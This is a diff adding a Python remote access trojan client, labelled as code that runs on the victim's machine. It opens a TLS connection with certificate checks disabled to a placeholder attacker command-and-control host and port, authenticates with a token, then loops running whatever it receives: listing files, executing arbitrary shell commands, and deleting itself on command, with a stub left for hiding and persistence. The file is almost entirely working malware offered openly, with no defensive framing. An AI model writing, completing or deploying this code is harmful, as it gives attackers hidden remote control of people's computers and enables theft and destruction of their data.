@@ -1,0 +1,61 @@
+# This runs on the victim's machine
+import socket
+import ssl
+import subprocess
+import os
+import sys
+import time
+
+# CONFIG
+C2_IP = "attacker_ip"
+C2_PORT = 4433
+AUTH_TOKEN = "victim_token"
+
+def hide_self():
+    # Conceptual: In a real RAT, this would inject into another process
+    # or modify registry for persistence.
+    pass
+
+def execute_command(cmd):
+    if cmd == "get_files":
+        return str(os.listdir("."))
+    elif cmd.startswith("run"):
+        # Dangerous: Runs system commands
+        command = cmd[4:]
+        try:
+            return subprocess.check_output(command, shell=True).decode()
+        except Exception as e:
+            return str(e)
+    elif cmd == "selfdestruct":
+        try:
+            os.remove(sys.argv[0]) # Deletes itself
+        except:
+            pass
+        sys.exit(0)
+    return "Command not recognized"
+
+def connect():
+    while True:
+        try:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            secure_sock = context.wrap_socket(sock, server_hostname=C2_IP)
+            secure_sock.connect((C2_IP, C2_PORT))
+            secure_sock.send(AUTH_TOKEN.encode())
+            
+            print("Connected to C2. Waiting for commands...")
+            
+            while True:
+                cmd = secure_sock.recv(1024).decode()
+                if not cmd: break
+                result = execute_command(cmd)
+                secure_sock.send(result.encode())
+        except Exception as e:
+            time.sleep(30) # Wait before retrying
+
+if __name__ == "__main__":
+    # hide_self() # Would be called in real malware
+    connect()
